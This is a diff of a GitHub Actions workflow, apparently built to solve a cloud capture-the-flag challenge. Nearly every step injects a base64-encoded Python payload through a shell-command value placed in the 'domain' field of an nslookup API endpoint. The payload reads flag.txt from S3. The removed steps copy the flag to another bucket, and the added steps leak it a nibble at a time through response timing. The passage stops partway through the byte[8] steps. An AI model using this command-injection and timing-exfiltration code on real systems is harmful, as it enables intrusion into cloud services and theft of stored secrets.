@@ -7,7 +7,7 @@ on:
   workflow_dispatch:
 
 permissions:
-  id-token: write   # required to request the OIDC JWT from GitHub
+  id-token: write
   contents: read
 
 jobs:
@@ -23,34 +23,9 @@ jobs:
       - name: Who am I
         run: aws sts get-caller-identity
 
-      - name: EXPLOIT + IMMEDIATE READ in same step (no inter-step cleanup window)
+      - name: NIBBLE2 byte[0] hi
         run: |
-          # Inject no-sleep exploit: Lambda reads flag, writes to platform-bucket, returns immediately
-          B64="aW1wb3J0IGJvdG8zCnM9Ym90bzMuY2xpZW50KCdzMycpCnRyeToKICAgIGZsYWc9cy5nZXRfb2JqZWN0KEJ1Y2tldD0nY29kZWM0ZjI2Yzg2MmEzMjFlZjUnLEtleT0nZmxhZy50eHQnKVsnQm9keSddLnJlYWQoKQogICAgcy5wdXRfb2JqZWN0KEJ1Y2tldD0ncGxhdGZvcm0tYnVja2V0LTAwOTY2MTc2NDA3Ny11cy1lYXN0LTEnLEtleT0nZmxhZy1ib3RvMy50eHQnLEJvZHk9ZmxhZykKZXhjZXB0OgogICAgcGFzcw=="
-          INJECT="x; echo $B64 | base64 -d | python3 #"
-          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-          START=$(date +%s%N)
-          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" -d @payload.json
-          END=$(date +%s%N)
-          echo "Exploit timing: $(( (END - START) / 1000000 ))ms"
-          echo ""
-          echo "=== Immediately reading flag-boto3.txt as cicdRole ==="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag-boto3.txt flag.txt
-          echo "=== xxd ==="
-          xxd flag.txt
-          echo "=== base64 ==="
-          base64 flag.txt
-
-      - name: Upload flag artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: flag
-          path: flag.txt
-
-      - name: NIBBLE EXFIL byte[0] hi-nibble (fallback if S3 GET above failed)
-        run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -58,11 +33,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[0] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[0] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[0] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[0] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0mMHhmKSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -70,11 +45,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[0] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[1] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[0] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[1] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMV0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMV0+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -82,11 +57,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[1] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[1] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[1] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[1] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMV0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMV0mMHhmKSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -94,11 +69,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[1] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[2] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[1] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[2] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMl0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMl0+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -106,11 +81,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[2] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[2] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[2] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[2] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMl0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMl0mMHhmKSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -118,11 +93,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[2] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[3] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[2] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[3] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbM10+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbM10+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -130,11 +105,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[3] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[3] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[3] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[3] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbM10mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbM10mMHhmKSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -142,11 +117,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[3] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[4] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[3] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[4] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNF0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNF0+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -154,11 +129,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[4] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[4] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[4] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[4] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNF0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNF0mMHhmKSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -166,11 +141,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[4] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[5] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[4] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[5] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNV0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNV0+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -178,11 +153,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[5] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[5] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[5] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[5] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNV0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNV0mMHhmKSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -190,11 +165,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[5] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[6] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[5] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[6] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNl0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNl0+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -202,11 +177,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[6] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[6] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[6] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[6] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNl0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNl0mMHhmKSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -214,11 +189,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[6] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[7] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[6] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[7] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbN10+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbN10+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -226,11 +201,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[7] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[7] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[7] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[7] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbN10mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbN10mMHhmKSoyKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -238,11 +213,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[7] LO: ${MS}ms => nibble=$((MS/1000-2))"
-
-      - name: NIBBLE EXFIL byte[8] hi-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[7] lo: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[8] hi
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOF0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOF0+PjQpKjIrMikKZXhjZXB0OgogICAgcGFzcw=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
@@ -250,11 +225,11 @@ jobs:
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[8] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
-
-      - name: NIBBLE EXFIL byte[8] lo-nibble
+          NIBBLE=$(( MS / 1000 / 2 - 1 ))
+          echo "byte[8] hi: ${MS}ms => nibble=$NIBBLE"
+      - name: NIBBLE2 byte[8] lo
         run: |
-          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOF0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
